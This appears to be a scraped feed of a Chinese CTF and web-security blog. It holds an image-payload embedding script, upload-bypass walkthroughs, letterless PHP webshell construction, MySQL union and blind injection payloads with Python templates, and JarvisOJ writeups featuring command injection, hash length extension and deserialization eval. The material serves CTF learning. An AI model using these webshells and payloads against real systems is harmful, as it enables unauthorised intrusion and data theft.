file_get_contents($argv[1]); $extraBytes &#x3D; 0; $correctImage &#x3D; TRUE; if($dis-&gt;readShort() !&#x3D; 0xFFD8) &#123; die(&#39;Incorrect SOI marker&#39;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() &#x3D;&#x3D; 0xFF)) &#123; $marker &#x3D; $dis-&gt;readByte(); $size &#x3D; $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker &#x3D;&#x3D;&#x3D; 0xDA) &#123; $startPos &#x3D; $dis-&gt;seek(); $outStreamTmp &#x3D; substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !&#x3D;&#x3D; 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() &#x3D;&#x3D;&#x3D; 0xFF) &#123; if($dis-&gt;readByte !&#x3D;&#x3D; 0x00) &#123; break; &#125; &#125; &#125; $stopPos &#x3D; $dis-&gt;seek() - 2; $imageStreamSize &#x3D; $stopPos - $startPos; $outStream &#x3D; substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream &#x3D; $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123; die(&#39;Success!&#39;); &#125; else &#123; break; &#125; &#125; &#125;&#125;unlink(&#39;payload_&#39;.$argv[1]);die(&#39;Something\\&#39;s wrong&#39;);function checkImage($filename, $data, $unlink &#x3D; FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage &#x3D; TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage;&#125;function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage &#x3D; FALSE; if(preg_match(&#39;&#x2F;(\\d+) extraneous bytes before marker&#x2F;&#39;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes &#x3D; (int)$m[1]; &#125; &#125;&#125;class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order &#x3D; false, $fromString &#x3D; false) &#123; $this-&gt;binData &#x3D; &#39;&#39;; $this-&gt;order &#x3D; $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#39;File not exists [&#39;.$filename.&#39;]&#39;); $this-&gt;binData &#x3D; file_get_contents($filename); &#125; else &#123; $this-&gt;binData &#x3D; $filename; &#125; $this-&gt;size &#x3D; strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData &#x3D; substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#39;End Of File&#39;); &#125; $byte &#x3D; substr($this-&gt;binData, 0, 1); $this-&gt;binData &#x3D; substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#39;End Of File&#39;); &#125; $short &#x3D; substr($this-&gt;binData, 0, 2); $this-&gt;binData &#x3D; substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short &#x3D; (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short &#x3D; (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) &#x3D;&#x3D;&#x3D; 0); &#125;&#125;?&gt; 使用方法： 随便找一个jpg图片,先上传至服务器然后再下载到本地保存为1.jpg， 使用脚本处理1.jpg,命令php jpg_payload.php 1.jpg 需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片 Pass-17考察点：竞争上传 通关方法： 这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。首先在burp中不断发送上传webshell的数据包： 然后不断在浏览器中访问，发现通过竞争可以访问到： Pass-18考察点：竞争上传+白名单 通关方法： 本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功： Pass-19考察点：00截断 通关方法： 本关考察CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，同时自定义保存名称，直接保存为php是不行的 查看代码，发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过： Pass-20考察点： 通关方法：","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"文件上传","slug":"文件上传","permalink":"http://www.moonback.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"无字母数字webshell","slug":"nowords-webshell","date":"2019-10-16T13:24:01.000Z","updated":"2020-04-20T06:34:36.334Z","comments":true,"path":"2019/10/16/nowords-webshell/","link":"","permalink":"http://www.moonback.xyz/2019/10/16/nowords-webshell/","excerpt":"本篇博客介绍了构造无字母数字webshell的一些方法！","text":"本篇博客介绍了构造无字母数字webshell的一些方法！ 一道有意思的题12345678910111213141516&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;]))&#123; $code &#x3D; $_GET[&#39;code&#39;]; if(strlen($code)&gt;40)&#123; die(&quot;Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;&#x2F;&#x2F;$hint &#x3D; &quot;php function getFlag() to get flag&quot;;?&gt; 分析代码可知只要执行getFlag()函数应该就可以得到flag了 但对code的长度限制&lt;40,并且code不能有数字和大小写字母 方式1(异或运算)先解释下异或运算 在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。 举个例子： A的ASCII值是65，对应的二进制值是01000001 ?的ASCII值是63，对应的二进制值是00111111 异或的二进制的值是01111110，对应的ASCII值是126，对应的字符串的值就是~了 我们都知道，PHP是弱类型的语言，也就是说在PHP中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于PHP弱类型的这个特点，我们对PHP的变类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码： 12345678&lt;?php function B()&#123; echo &quot;Hello Angel_Kitty&quot;; &#125; $_++; $__&#x3D; &quot;?&quot; ^ &quot;&#125;&quot;; $__();?&gt; 我们一起来分析一下上面这段代码： $_++;这行代码的意思是对变量名为&quot;_&quot;的变量进行自增操作，在PHP中未定义的变量默认值为null,null==false==0,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。 $__=&quot;?&quot; ^ &quot;&#125;&quot;;对字符”?”和”&#125;”进行异或运算，得到结果B赋给变量名为”__”(两个下划线)的变量 $ __ ();通过上面的赋值操作，变量$__的值为B，所以这行可以看作是B(),在PHP中,这行代码表示调用函数B,所以执行结果为Hello Angel_Kitty。在PHP中，我们可以将字符串当作函数来处理。 下面是个非常简单的非数字字母的PHP后门： 123456789&lt;?php @$_++; &#x2F;&#x2F; $_ &#x3D; 1 $__&#x3D;(&quot;#&quot;^&quot;|&quot;); &#x2F;&#x2F; $__ &#x3D; _ $__.&#x3D;(&quot;.&quot;^&quot;~&quot;); &#x2F;&#x2F; _P $__.&#x3D;(&quot;&#x2F;&quot;^&quot;&#96;&quot;); &#x2F;&#x2F; _PO $__.&#x3D;(&quot;|&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POS $__.&#x3D;(&quot;&#123;&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POST $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); &#x2F;&#x2F; $_POST[0]($_POST[1]);?&gt; _POST的拼接可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下： $__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;); 或者 $__=&quot;#./|&#123;&quot;^&quot;|~`//&quot;; 注意#的url编码，否则会相当于注释 同样_GET也可以这样拼接 $__=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot; 按照这种方法，可得payload ?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=getFlag ?code=$_=&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_(); //$_=&#39;getFlag&#39; ?code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊(); 相当于 $啊=getFlag;$啊(); 这里就不需要用 &#123;&#125; 了，因为取反的值直接被当作字符串赋值给了 $ 啊 方式2(取反运算)主要原理： 利用的是UTF-8编码的某个汉字，将其中某个字符取出来取反 比如&quot;和&quot;[2]的结果是&quot;\\x8c&quot;，其取反即为字母s 123456&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;))b&#39;\\xe5\\x92\\x8c&#39;&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;)[2])140&gt;&gt;&gt; print(~&quot;和&quot;.encode(&#39;utf8&#39;)[2])-141 举个例子： 123456789101112131415161718192021222324252627282930&lt;?php$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;); &#x2F;&#x2F;$__&#x3D;2$_&#x3D;$__&#x2F;$__; &#x2F;&#x2F;$_&#x3D;1$____&#x3D;&#39;&#39;;$___&#x3D;&quot;瞰&quot;;$____.&#x3D;~($___&#123;$_&#125;); &#x2F;&#x2F;$____&#x3D;&#39;a&#39;$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;); &#x2F;&#x2F;$____&#x3D;&#39;as&#39;$___&#x3D;&quot;的&quot;;$____.&#x3D;~($___&#123;$_&#125;); &#x2F;&#x2F;$____&#x3D;&#39;ass&#39;$___&#x3D;&quot;半&quot;;$____.&#x3D;~($___&#123;$_&#125;); &#x2F;&#x2F;$____&#x3D;&#39;asse&#39;$___&#x3D;&quot;始&quot;;$____.&#x3D;~($___&#123;$__&#125;); &#x2F;&#x2F;$____&#x3D;&#39;assert&#39;$_____&#x3D;&#39;_&#39;;$___&#x3D;&quot;俯&quot;;$_____.&#x3D;~($___&#123;$__&#125;); &#x2F;&#x2F;$_____&#x3D;&#39;_P&#39;$___&#x3D;&quot;瞰&quot;;$_____.&#x3D;~($___&#123;$__&#125;); &#x2F;&#x2F;$_____&#x3D;&#39;_PO&#39;$___&#x3D;&quot;次&quot;;$_____.&#x3D;~($___&#123;$_&#125;); &#x2F;&#x2F;$_____&#x3D;&#39;_POS&#39;$___&#x3D;&quot;站&quot;;$_____.&#x3D;~($___&#123;$_&#125;); &#x2F;&#x2F;$_____&#x3D;&#39;_POST&#39;$_&#x3D;$$_____; &#x2F;&#x2F;$_&#x3D;$_POST$____($_[$__]); 这里也有一种简短的写法$&#123;~&quot;\\xa0\\xb8\\xba\\xab&quot;&#125;它等于$_GET。这里相当于直接把utf8编码的某个字节提取出来统一进行取反。 那麽利用这种方式可得payload ?code=$_=~%98%9A%8B%B9%93%9E%98;$_(); //%_为getFlag取反然后URL编码得结果 或 ?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag 拼接出了 $_GET‘+’;，传入 +=getFlag() 从而执行了函数 注意点： php5和php7是有区别的 PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(&#39;phpinfo&#39;)();来执行函数，第一个括号中可以是任意PHP表达式。 升级版升级版增加了对_和$的过滤，但还是有方法绕过的 12345678910111213&lt;?phpif(isset($_GET[&#39;code&#39;]))&#123; $code &#x3D; $_GET[&#39;code&#39;]; if(strlen($code)&gt;35)&#123; die(&quot;Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; eval($code);&#125;else&#123; highlight_file(__FILE__);&#125; 解题方法这道题刚好是在linux系统上，并且开启了短标签 在linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用? * %等字符来替代，当然这里想要执行命令，需要极限的利用这个方法，经过测试： ???/??? =&gt; /bin/cat PHP开启短标签即short_open_tag=on时，可以使用&lt;?=$_?&gt;输出变量于是读源码： $_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt; &quot;/bin/cat /var/www/html/index.php&quot; 长度超出上限，使用通配： $_=/???/???%20/???/???/????/;?&gt;&lt;?=$_?&gt; 正则过滤了$和_,改进为： ?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt; 可以读到： 1234function getFlag()&#123; $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;); echo $flag;&#125; 直接读flag文件 ?&gt;&lt;?=`/???/???%20/????`;?&gt; 参考： https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"webshell","slug":"webshell","permalink":"http://www.moonback.xyz/tags/webshell/"}]},{"title":"github博客优化","slug":"github-blog-domain","date":"2019-10-16T12:59:35.000Z","updated":"2019-10-16T13:04:26.877Z","comments":true,"path":"2019/10/16/github-blog-domain/","link":"","permalink":"http://www.moonback.xyz/2019/10/16/github-blog-domain/","excerpt":"闲来无事，搞了个域名，试试把买的域名解析到博客上！","text":"闲来无事，搞了个域名，试试把买的域名解析到博客上！ github pages绑定自己的域名修改域名解析我是在腾讯云买的域名，阿里云配置也类似 添加主机记录为子域名（不能为全部域名，这里为blog）,记录类型为CNAME,记录值为原博客地址 修改github项目配置找到博客项目，然后Settings，找到Github Pages 将Custom domain设置成自己的域名（没有http://或https://） 添加CNAME文件在博客目录source文件夹里添加CNAME文件 内容填写为你要设置的域名 例如我的： 1blog.moonback.xyz 然后 hexo g ,hexo d就行了 可能不会马上解析成功，等段时间就好","categories":[],"tags":[{"name":"博客","slug":"博客","permalink":"http://www.moonback.xyz/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"折腾","slug":"折腾","permalink":"http://www.moonback.xyz/tags/%E6%8A%98%E8%85%BE/"}]},{"title":"Mysql注入方法","slug":"mysql-injection","date":"2019-10-16T07:29:43.000Z","updated":"2020-05-08T06:45:46.933Z","comments":true,"path":"2019/10/16/mysql-injection/","link":"","permalink":"http://www.moonback.xyz/2019/10/16/mysql-injection/","excerpt":"本篇博客主要介绍了mysql注入的一些方法！","text":"本篇博客主要介绍了mysql注入的一些方法！ 可以回显sql错误的注入联合查询必了解的东西： 数据库information_schema用来存储其他数据库的信息，包括所有的数据库名称，表名，字段 SCHEMATA表：提供了当前mysql实例中所有数据库的信息 字段schemata_name：所有数据库的名称 TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息 字段table_schema：所有数据库的名称(重复） 字段table_name:所有表的名称 COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。 字段table_schema：所有数据库的名称(重复） 字段table_name:所有表的名称（重复） 字段column_name：所有列的名称 1payload:？id&#x3D;-1%27%20union%20select%20null,group_concat(schema_name),null%20from%20information_schema.schemata%23 ​ 解释：​ id=-1 是为了让网页回显不了内容，从而让联合查询的结果显示​ %27 单引号’的url编码,闭合id的内容​ %20 代表空格的url编码​ union 联合查询字符​ group_concat()函数 将查询的结果一行显示​ null,group_concat(schema_name),null 个数取决于网页本身查询的字段个数​ %23 #号的url编码，可以用--%20代替，用于注释后面的sql语句 order bypayload: ?id=1&#39; order by 3%23 判当前页面数据表共有多少列 步骤 判断回显位 ?id=-1&#39; union select 1,2,3%23 爆数据库 ?id=-1%27%20union%20select%20null,group_concat(schema_name),null%20from%20information_schema.schemata%23 爆表 ?id=-1&#39; union select null,group_concat(table_name),null from information_schema.tables where table_schema=database()%23 或 ?id=-1&#39; union select null,group_concat(table_name),null from information_schema.tables where table_schema=&#39;xxxx&#39;%23 xxx为爆出来的数据库名 前两个步骤可以直接写成： ?id=-1&#39; union select null,group_concat(schema_name),(select group_concat(table_name) from information_schema.tables where table_schema=database()) from information_schema.schemata%23 爆字段 ?id=-1&#39; union select null,group_concat(column_name),null from information_schema.columns where table_name=&#39;xxx&#39;%23 ?id=-1&#39; union select null,group_concat(column_name),null from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()%23 最好是第二种，对数据库限制，防止不同数据库有相同的表 爆内容 ?id=-1&#39; union select null,group_concat(username,0x23,password),null from security.users where id=2 %23 重点理解在不知道如何构造payload,可以先让其报错，根据报错信息分析构造 目的： 让传参前面的符号闭合，使后面的联合查询当成sql语句执行 盲注什么是盲注呢？ 简单说，当想要得到的数据信息(比如数据库名，表名，字段名等)无法回显到屏幕上，就可以用某些函数对数据进行爆破处理。 比如想要得到数据库名，就可以用函数截取数据库名的第一个字符，然后爆破，如果第一个字符等于某个字符，就让其执行某些操作（比如，睡3s），不断进行下一个字符的爆破，拼接起来就是数据 先介绍几个函数 if函数 格式：IF(Condition,A,B) 含义：如果Condition成立，则A，否则B substr函数 格式：SUBSTR(string,start,len) 含义：从string的start位开始截取len个字符 mid函数 格式：MID(column_name,start[,length]) 含义：从column_name中start位开始截取length(可选参数)长度 ascii函数 格式：ASCII(char) 含义：将char转化成ascii码 left函数 格式：LEFT ( string, n ) 含义：函数得到字符串左部指定个数的字符，string为要截取的字符串，n为长度。 right函数 格式：RIGHT( string, n ) 含义：函数得到字符串右部指定个数的字符，string为要截取的字符串，n为长度。 length函数 格式：LENGTH(string) 含义：得到string的长度 基于时间的盲注基于时间的盲注（延时注入）是主要针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术 这里基于时间的盲注主要用的就是sleep()函数，根据反应时间来确定是否正确 一般用下面的模板就可以解决 123456try: payload&#x3D; &#39;*** and if(ascii(substr(***,1,1))&#x3D;*,sleep(3),0)%23&#39; r&#x3D;requests.get(url+payload,timeout&#x3D;3) &#x2F;&#x2F;注意要设置设置timeoutexcept requests.exceptions.ReadTimeout as e: &#x2F;&#x2F;超时异常 data+&#x3D;chr(j) break 布尔型盲注布尔型盲注和基于时间的盲注最大的区别就是布尔型盲注是根据页面回显内容不同来判断的，而时间盲注不需要在意这一点，只需判断响应时间就行 一般用下面的模板就可以解决 1234567try: payload&#x3D; &#39;*** and ascii(substr(***,1,1))&#x3D;*%23&#39; r&#x3D;requests.get(url+payload) if &quot;***&quot; in r.text: data+char(j)except Exceptions as e: break 报错注入这个好像有点多，单独写一篇博客总结一下：https://www.moonback.xyz/2019/10/25/mysql-wrong-injection/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"sql注入","slug":"sql注入","permalink":"http://www.moonback.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"jarvisoj web部分writeup","slug":"jarvisoj-web-wp","date":"2019-10-05T13:52:51.000Z","updated":"2020-04-23T09:15:50.363Z","comments":true,"path":"2019/10/05/jarvisoj-web-wp/","link":"","permalink":"http://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/","excerpt":"本篇博客介绍了jarvisOJ上web部分题writeup！！！","text":"本篇博客介绍了jarvisOJ上web部分题writeup！！！ [61dctf]babyphp打开题目发现提示git搭建的，有没有源码泄露？ githack跑下，得到源码 12345678910&lt;?phpif (isset($_GET[&#x27;page&#x27;])) &#123; $page = $_GET[&#x27;page&#x27;];&#125; else &#123; $page = &quot;home&quot;;&#125;$file = &quot;templates/&quot; . $page . &quot;.php&quot;;assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);assert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);?&gt; 从泄露里可以看到有flag.php，猜测flag在里面 从源码里可以看到可以代码执行 payload: ?page=&#39;^system(&#39;cat templates/flag.php&#39;)^&#39; 得到flag [61dctf]admin打开题目网址： dirsearch一扫 访问robots.txt 访问提示的内容 flag出来了？那么简单？就是那么简单 LOCALHOST打开题目网址： 仅本机访问，立刻想到抓包改XFF flag就这样出来了，是不是很简单？就是这样简单 PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125; flag在管理员手里打开提示Only Admin can see the flag!! 抓包看下，很明显问题的入手点在Cookie这里 url解码发现是 改下guest重新发包发现没反应，应该和hsh有关系 没什么思路，就扫下路径吧，dirsearch扫到备份文件index.php~，但打开发现不能看到源码 猜测是vi异常退出的文件，第一次异常退出会产生一个*.swp，再次意外退出后，将会产生名为*.swo的交换文件；而第三次产生的交换文件则为*.swn的文件，依此类推。 可以直接用vim -r恢复文件 恢复出来的关键代码 123456789101112131415161718192021222324&lt;?php $auth = false;$role = &quot;guest&quot;;$salt = if (isset($_COOKIE[&quot;role&quot;])) &#123; $role = unserialize($_COOKIE[&quot;role&quot;]); $hsh = $_COOKIE[&quot;hsh&quot;]; if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125;&#125; else &#123; $s = serialize($role); setcookie(&#x27;role&#x27;,$s); $hsh = md5($salt.strrev($s)); setcookie(&#x27;hsh&#x27;,$hsh);&#125;if ($auth) &#123; echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &#125; else &#123; echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;&#125;?&gt; 这段代码的意思就是反序列化Cookie里的role，将salt(未知)和反转后的role拼接一起并MD5加密，然后与Cookie里的hash比较，相等就会输出flag 这就要用到hash扩展攻击的知识参见我的另外一篇博客：https://www.moonback.xyz/2019/12/16/hash-extend-attack/ 由于我们不知道$salt的长度，所以我们需要对其长度爆破，爆破之前，我们需要知道的是反序列化函数存在00截断，为保证$role===&quot;admin&quot;，我们必须s:5:&quot;guest&quot;;在前面，注意服务端在md5加密的是反转的role的键值。所以我们构造的payload应该为以下内容，最终知道salt的长度为12(0c) 这里有个脚本，需要装个hashpumpy库 123456789101112131415161718import hashpumpyimport urllibimport requestsurl=&#x27;http://web.jarvisoj.com:32778/&#x27;hsh=&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;s1=&#x27;&#x27;&#x27;s:5:&quot;guest&quot;;&#x27;&#x27;&#x27;s2=&#x27;&#x27;&#x27;s:5:&quot;admin&quot;;&#x27;&#x27;&#x27;for i in range(1,30): m=hashpumpy.hashpump(hsh,s1[::-1],s2[::-1],i) # 四个参数分别为 hash值 secret后的字符串 更改后secret后的字符串 secret的长度 print i Cookie=&quot;role=&quot;+urllib.quote(urllib.unquote(m[1])[::-1])+&quot;; hsh=&quot;+m[0] headers=&#123;&quot;Cookie&quot;:Cookie&#125; r=requests.get(url,headers=headers) if &quot;Welcome&quot; in r.text: print r.text; break PHPINFO拿到题是这样的 1234567891011121314151617181920212223242526&lt;?php&#x2F;&#x2F;A webshell is wait for youini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz &#x3D; &#39;phpinfo();&#39;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET[&#39;phpinfo&#39;]))&#123; $m &#x3D; new OowoO();&#125;else&#123; highlight_string(file_get_contents(&#39;index.php&#39;));&#125;?&gt; 既然题目告诉我们phpinfo,我们就尝试访问一下,发现果然存在 从phpinfo能看出来好多东西，这里就不绕弯子了 本题考察的就是session反序列化的知识 session.save_path是指session的存储路径，如果是no value，那么将会是默认路径/tmp/sess_** session.serialize_handler是指session的序列化引擎。Master Value是PHP.ini文件中的内容，Local value 是当前目录中的设置，这个值会覆盖Master Value中对应的值 session.upload_progress.cleanup这个是指session上传进度是否自动清除的选项 可以看下手册 大概意思就是，如果session上传进度开启的话，可以POST一个PHP_SESSION_UPLOAD_PROGRESS变量，上传进度会保存在$_SESSION中，然后通过php序列化引擎的不同来导致漏洞（session的写入会序列化，session的读取会反序列化） 1234567891011121314151617&lt;?phpclass OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz &#x3D; &#39;恶意代码&#39;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;$a&#x3D;new OowoO();echo serialize($a);?&gt; 序列化的结果 O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:16:&quot;恶意代码&quot;;&#125; //长度修改下 这里我们用下面这个网页构造 12345&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt; 抓包可以看到 从phpinfo可以看到网站路径是/opt/lampp/htdocs，然后在filename插入反序列化的内容 |O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:36:\\&quot;print_r(scandir(dirname(__FILE__)));\\&quot;;&#125; |O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:88:\\&quot;print_r(file_get_contents(\\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\&quot;));\\&quot;;&#125; api调用这题就是一个简单的xxe 抓包将Content-Type改成application/xml，POST区添加而已xml就行 Easy Gallery打开题目，发现有三个页面 切换一下发现有page这个参数，瞬间想到了文件包含 试试index.php 发现是fopen函数，想到了%00截断，试试吧 构造类似的payload： index.php?page=uploads/1576482315.gif%00 上传一个gif/jpg图片马，发现 对&lt;?php或?&gt;做了过滤? 试试&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;吧 得到flag，感觉View功能都没用上2333….. IN A Mess打开题目网址： 看到id=1，第一时间想到注入，很可惜不是注入 查看源代码看到有个提示，访问一下 得到一大串代码，排版一下 传入三个参数，id,a,b id值等于0但自身不能为0,可以弱类型比较 a涉及file_get_contents，需用伪协议php://input传入”1112 is a nice lab!” b长度大于5且可能涉及eregi绕过，可以用%00截断 payload1:?id=0.&amp;a=php://input&amp;b=%000x34aa 并post个1112 is a nice lab! payload2:?id=0e&amp;a=data:,1112 is a nice lab!&amp;b=%00411111 关于payload2中data:后为什么有逗号，具体参见：https://blog.csdn.net/qq1045553189/article/details/87479691 本以为得到了flag,提交发现错误，再看看500大分的题，应该不会那么简单，再战 也不绕弯子了，直接访问我们我们得到的信息，果然有这个网页，不要问我为什么&gt;_&lt; 又看到id=1了，再次想到注入，这次对了，加个/,发现 尝试id=2-1,发现返回还是id=1的结果，说明代入执行了，存在注入回显为如果检测到注入就返回you bad boy/girl!，如果执行了查询不到结果就返回执行语句 order by 判断列数，发现被过滤了， 将空格替换成/**/发现也被过滤了，将空格替换为/1/，返回hi666 当为4时报错，只有三列，联合查询判断回显位，发现发现union,select,from都被替换为空了，双写即可绕过 ?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,database(),3%23 执行发现回显3，说明第三个位置为回显位 ?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,database()%23 爆出数据库test ? id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*1*/frfromom/*1*/information_schema.tables/*1*/where/*1*/table_schema=database()%23 爆出表为content ?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*1*/table_schema=database()# 爆出字段id,context,title ?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(id,0x23,context,0x23,title)/*1*/frfromom/*1*/test.content# PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125; 神盾局的秘密打开题目，发现是一张图片，Ctrl+U查看源码发现 猜测img传的东西是base64加密的，解密以下发现是shield.jpg，换成其他/etc/passwd发现不行，尝试包含index.php,showimg.php,shield.php index.php: 123456789&lt;?php require_once(&#x27;shield.php&#x27;); $x = new Shield(); isset($_GET[&#x27;class&#x27;]) &amp;&amp; $g = $_GET[&#x27;class&#x27;]; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; showing.php: 123456789101112&lt;?php $f = $_GET[&#x27;img&#x27;]; if (!empty($f)) &#123; $f = base64_decode($f); if (stripos($f,&#x27;..&#x27;)===FALSE 